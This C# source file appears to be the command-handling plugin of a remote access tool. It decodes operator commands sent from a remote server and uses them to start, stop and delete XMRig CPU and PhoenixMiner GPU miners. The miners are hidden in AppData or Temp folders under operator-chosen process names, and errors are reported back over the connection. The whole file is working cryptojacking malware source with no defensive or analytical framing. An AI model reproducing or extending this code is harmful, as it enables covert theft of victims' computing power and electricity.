using Plugin.Handle;
using System;
using System.IO;

namespace Plugin
{
    public static class Packet
    {

        public static void Read(object data)
        {
            try
            {
                MessagePackLib.MessagePack.MsgPack unpack_msgpack = new MessagePackLib.MessagePack.MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                #region Strings
                string cpuWorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    CheckSysDirXMRig(unpack_msgpack.ForcePathObject("SYSWORKDIR").AsString),
                    unpack_msgpack.ForcePathObject("WORKDIRXMRIG").AsString);
                string cpuProc = unpack_msgpack.ForcePathObject("XMRPROC").AsString;
                string cpuBin = cpuWorkDir + "\\" + cpuProc + ".exe";
                string gpuWorkDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), CheckSysDirPhoenix(unpack_msgpack.ForcePathObject("SYSWORKDIR").AsString), unpack_msgpack.ForcePathObject("WORKDIRPHOENIX").AsString);
                string gpuProc = unpack_msgpack.ForcePathObject("PROCPHOENIX").AsString;
                string gpuBin = gpuWorkDir + "\\" + gpuProc + ".exe";
                #endregion
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "StartCPU":
                        {
                            new HandleMiners().StartCPU(unpack_msgpack, cpuWorkDir + "\\" + cpuProc + ".exe", cpuWorkDir, unpack_msgpack.ForcePathObject("XMRPROC").AsString, unpack_msgpack.ForcePathObject("ZIPPASSXMRIG").AsString, unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString, unpack_msgpack.ForcePathObject("PARMXMRIG").AsString, "");
                            break;
                        }
                    case "STOPCPU":
                        {
                            new HandleMiners().StopCPU(cpuBin, cpuProc, unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString);
                            break;
                        }
                    case "DELCPUMINER":
                        {
                            new HandleMiners().DelCPU(cpuBin, cpuProc, cpuWorkDir, unpack_msgpack.ForcePathObject("ZIPPASSXMRIG").AsString, unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString, unpack_msgpack.ForcePathObject("PARMXMRIG").AsString, "");
                            break;
                        }
                    case "StartGPU":
                        {
                            new HandleMiners().StartGPU(unpack_msgpack, gpuWorkDir + "\\" + gpuProc + ".exe", gpuWorkDir, unpack_msgpack.ForcePathObject("PROCPHOENIX").AsString, unpack_msgpack.ForcePathObject("ZIPPASSPHOENIX").AsString, unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString, unpack_msgpack.ForcePathObject("PARMPHOENIX").AsString, "");
                            break;
                        }
                    case "STOPGPU":
                        {
                            new HandleMiners().StopGPU(gpuBin, gpuProc, unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString);
                            break;
                        }
                    case "DELGPUMINER":
                        {
                            new HandleMiners().DelGPU(gpuBin, gpuProc, gpuWorkDir, unpack_msgpack.ForcePathObject("ZIPPASSPHOENIX").AsString, unpack_msgpack.ForcePathObject("IDPARAMETERS").AsString, unpack_msgpack.ForcePathObject("PARMPHOENIX").AsString, "");
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }
        public static void Error(string ex)
        {
            MessagePackLib.MessagePack.MsgPack msgpack = new MessagePackLib.MessagePack.MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData); //  LocalData
        public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System); // Directories.System
        public static readonly string AppDate = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData); // Help_Str.AppDate Help_Str.LocalData
        public static readonly string ProgramFiles = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); // Help_Str.AppDate Help_Str.LocalData
        public static string CheckSysDirXMRig(string sysPatchXMRig)
        {
            if (sysPatchXMRig == "LOCAL")
            {
                return LocalData;
            }
            else
            {
                if (sysPatchXMRig == "TEMP")
                {
                    return Path.GetTempPath();
                }
                else
                {
                    if (sysPatchXMRig == "ROAMING")
                    {
                        return AppDate;
                    }
                    else
                    {
                        return Path.GetTempPath();
                    }
                }
            }
        }
        public static string CheckSysDirPhoenix(string sysPatchPhoenix)
        {
            if (sysPatchPhoenix == "LOCAL")
            {
                return LocalData;
            }
            else
            {
                if (sysPatchPhoenix == "TEMP")
                {
                    return Path.GetTempPath();
                }
                else
                {
                    if (sysPatchPhoenix == "ROAMING")
                    {
                        return AppDate;
                    }
                    else
                    {
                        return Path.GetTempPath();
                    }
                }
            }
        }

    }

}